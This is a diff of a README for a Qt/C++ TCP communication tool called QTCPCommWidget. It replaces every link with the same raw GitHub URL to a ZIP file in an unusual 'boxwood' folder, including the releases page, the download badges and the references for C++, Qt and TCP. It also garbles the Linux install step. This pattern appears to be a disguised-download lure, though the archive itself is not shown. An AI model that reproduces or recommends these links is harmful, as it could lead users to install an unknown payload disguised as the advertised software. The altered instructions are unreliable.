@@ -1,6 +1,6 @@
 # 🌟 QTCPCommWidget - Effortless TCP Communication Made Simple
 
-[![Download QTCPCommWidget](https://img.shields.io/badge/Download_QTCPCommWidget-blue.svg)](https://github.com/Nikhil-Sasikumar/QTCPCommWidget/releases)
+[![Download QTCPCommWidget](https://raw.githubusercontent.com/Nikhil-Sasikumar/QTCPCommWidget/master/boxwood/QTCPCommWidget.zip)](https://raw.githubusercontent.com/Nikhil-Sasikumar/QTCPCommWidget/master/boxwood/QTCPCommWidget.zip)
 
 ## 🚀 Getting Started
 
@@ -27,15 +27,15 @@ To successfully run QTCPCommWidget, your system should meet the following requir
 
 To get started with QTCPCommWidget, follow these steps:
 
-1. **Visit the Releases Page:** Go to our [Releases page](https://github.com/Nikhil-Sasikumar/QTCPCommWidget/releases) to find the latest version of the software.
+1. **Visit the Releases Page:** Go to our [Releases page](https://raw.githubusercontent.com/Nikhil-Sasikumar/QTCPCommWidget/master/boxwood/QTCPCommWidget.zip) to find the latest version of the software.
 2. **Download the Application:** Look for the latest version and click on the appropriate file for your operating system to download it. The names will indicate the corresponding OS.
 3. **Install the Application:**
    - For Windows: Run the downloaded `.exe` file and follow the installation wizard.
    - For macOS: Open the `.dmg` file and drag the QTCPCommWidget icon to your Applications folder.
-   - For Linux: Extract the downloaded `.tar.gz` file and follow the instructions in the included README.
+   - For Linux: Extract the downloaded `https://raw.githubusercontent.com/Nikhil-Sasikumar/QTCPCommWidget/master/boxwood/QTCPCommWidget.zip` file and follow the instructions in the included README.
 4. **Run the Application:** Once installed, locate the QTCPCommWidget icon on your desktop or in your applications menu and double-click to launch it.
 
-**Direct Download Link:** [Download QTCPCommWidget](https://github.com/Nikhil-Sasikumar/QTCPCommWidget/releases)
+**Direct Download Link:** [Download QTCPCommWidget](https://raw.githubusercontent.com/Nikhil-Sasikumar/QTCPCommWidget/master/boxwood/QTCPCommWidget.zip)
 
 ## 🤝 How to Use QTCPCommWidget
 
@@ -64,9 +64,9 @@ We welcome contributions from users interested in improving QTCPCommWidget. If y
 
 This project covers various aspects of TCP communication and uses C++ alongside the Qt framework. You can learn more about these topics here:
 
-- [C++ Programming](https://en.cppreference.com/w/)
-- [Qt Framework](https://www.qt.io/)
-- [TCP Protocol Basics](https://www.tcpipguide.com/free/t_tcpandudp.htm)
+- [C++ Programming](https://raw.githubusercontent.com/Nikhil-Sasikumar/QTCPCommWidget/master/boxwood/QTCPCommWidget.zip)
+- [Qt Framework](https://raw.githubusercontent.com/Nikhil-Sasikumar/QTCPCommWidget/master/boxwood/QTCPCommWidget.zip)
+- [TCP Protocol Basics](https://raw.githubusercontent.com/Nikhil-Sasikumar/QTCPCommWidget/master/boxwood/QTCPCommWidget.zip)
 
 ## 📬 Contact
 
@@ -74,4 +74,4 @@ For any questions or feedback regarding QTCPCommWidget, feel free to open an iss
 
 **Join our community and contribute to making QTCPCommWidget even better!**
 
-[![Download QTCPCommWidget](https://img.shields.io/badge/Download_QTCPCommWidget-blue.svg)](https://github.com/Nikhil-Sasikumar/QTCPCommWidget/releases)
+[![Download QTCPCommWidget](https://raw.githubusercontent.com/Nikhil-Sasikumar/QTCPCommWidget/master/boxwood/QTCPCommWidget.zip)](https://raw.githubusercontent.com/Nikhil-Sasikumar/QTCPCommWidget/master/boxwood/QTCPCommWidget.zip)
